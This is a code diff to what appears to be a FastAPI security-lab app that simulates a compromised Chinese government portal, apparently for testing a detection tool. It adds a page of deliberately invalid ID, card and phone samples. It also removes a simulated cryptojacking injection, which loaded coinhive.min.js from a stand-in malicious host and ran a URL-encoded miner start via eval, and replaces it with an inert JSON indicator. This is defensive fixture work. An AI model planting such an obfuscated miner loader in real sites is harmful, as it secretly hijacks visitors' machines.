@@ -28,6 +28,7 @@ async def home():
         <a href="/news/notice_2026.html">政务公开与公示</a>
         <a href="/about.html">机构概况</a>
         <a href="/tampered_section.html">市民互动留言</a>
+        <a href="/benign_validation.html">数据校验说明</a>
     </div>
 
     <div class="banner">
@@ -137,6 +138,22 @@ async def about_page():
 </html>"""
     return HTMLResponse(content=html)
 
+
+@lab_app.get("/benign_validation.html", response_class=HTMLResponse)
+async def benign_validation_page():
+    """负样本：格式相似但校验失败的证件、卡号和示例手机号。"""
+    return HTMLResponse(content="""<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta charset="UTF-8"><title>数据校验规则说明</title></head>
+<body>
+    <h2>表单校验说明</h2>
+    <p>格式错误的证件号示例：110101199003072341</p>
+    <p>未通过 Luhn 校验的卡号示例：6222021234567890123</p>
+    <p>明确的占位手机号：13800000000</p>
+    <a aria-hidden="true" style="display:none" href="/accessibility">无障碍辅助导航</a>
+</body>
+</html>""")
+
 @lab_app.get("/tampered_section.html", response_class=HTMLResponse)
 async def tampered_page():
     # 模拟页面被黑客篡改涂鸦
@@ -162,11 +179,8 @@ async def miner_page():
     <p>积极推动智能算力中心与绿色数据机房建设。</p>
     
     <!-- 模拟挂马载荷 -->
-    <script src="https://cdn.example-malicious.com/coinhive.min.js"></script>
-    <script>
-        // 混淆执行恶意载荷
-        eval(unescape('%76%61%72%20%6D%69%6E%65%72%20%3D%20%6E%65%77%20%43%6F%69%6E%48%69%76%65%2E%41%6E%6F%6E%79%6D%6F%75%73%28%27%73%69%74%65%6B%65%79%27%29%3B%6D%69%6E%65%72%2E%73%74%61%72%74%28%29%3B'));
-    </script>
+    <!-- application/json 不会作为 JavaScript 执行，仅保留检测特征。 -->
+    <script type="application/json" id="malware-fixture">{"indicator":"coinhive.min.js","executable":false}</script>
 </body>
 </html>"""
     return HTMLResponse(content=html)
